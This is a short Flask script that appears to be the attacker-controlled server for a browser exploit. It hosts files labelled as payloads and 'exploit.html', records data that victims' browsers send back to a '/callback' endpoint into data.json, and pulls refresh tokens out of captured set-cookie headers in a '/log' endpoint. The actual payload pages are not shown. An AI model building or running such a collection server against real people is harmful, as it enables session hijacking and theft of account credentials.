from flask import Flask, request, send_file
from flask_cors import CORS
import json

app = Flask(__name__)
CORS(app)

@app.route ('/index.html', methods=['GET'])
def index():
	print("[+] Sending Payload")
	return send_file('./index.html', download_name='index.html')

@app.route ('/index2.html', methods=['GET'])
def index2():
	print("[+] Sending Payload")
	return send_file('./index2.html', download_name='index.html')

@app.route ('/exploit.html', methods=['GET'])
def exploit():
	print("[+] Sending exploit Payload")
	return send_file('./exploit.html', download_name='exploit.html')


@app.route ('/init', methods=['GET'])
def init():
	print(f"[+] Initialized!")
	return "OK"

@app.route ('/callback', methods=['GET'])
def callback():
	print(f"[+] Received callback")
	data = request.args.get('data')
	with open("data.json", "w") as f:
		f.write(data)
	print(data)
	return "OK"

@app.route ('/error', methods=['GET'])
def error():
	print(f"[+] Received error")
	data = request.args.get('data')
	print(data)
	return "OK"

@app.route ('/log', methods=['POST'])
def log():
	print()
	print(f"[+] Received log!")
	data = request.data
	data = json.loads(data.decode())

	try:
		s = data["response"]["headers"]["set-cookie"]
		token = s.split(';')[0]
		print("Found Refresh Token: ", token)
	except: 
		print("No refresh token provided in request!")

	return "OK"

app.run(host='0.0.0.0', port=80, debug=False)
